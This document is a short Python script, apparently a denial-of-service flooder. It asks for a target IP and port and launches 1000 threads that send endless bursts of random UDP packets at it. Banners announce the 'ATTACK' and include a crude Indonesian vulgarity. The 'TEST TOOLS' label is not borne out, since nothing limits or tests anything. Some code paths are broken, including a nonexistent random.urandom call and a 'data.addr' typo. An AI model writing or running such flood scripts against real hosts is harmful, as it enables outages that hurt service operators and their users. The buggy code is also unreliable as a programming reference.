import socket
import os
import random
import threading
import sys

print("TEST TOOLS")
print("H4N5")

ip = str(input("Hot/ip: "))
port = str(input("Port: "))
choice = str(input("UDP (y/n): "))
os.system("clear")

def udp():
    while True:
        try:
            data = os.urandom(9000)
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(1000):
             s.sendto(data,addr)
            print("H4N5")
        except :
            print("[H4N5] ATTACK TO %s PORT %s"%(ip,port))
            
def tcp():
    while True:
        try:
            data = os.urandom(709)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            addr = (str(ip),int(port))
            for x in range(5000):
             s.sendto(data,addr)
             print("ATTACK")
        except :
              print("ATTACK %s PORT %s"%(ip,port))
             
def fuxy():
    while True:
        try:
            data = random.urandom(999)
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(2000):
                s.sendto(data.addr)
                print("KONTOL")
        except:
                print("\033[91m TO %s PORT %s"%(ip,port))
            
for y in range(1000):
	if choice == 'y':
		th = threading.Thread(target = udp)
		th.start()
	else:
		th = threading.Thread(target = fuxy)
		th.start()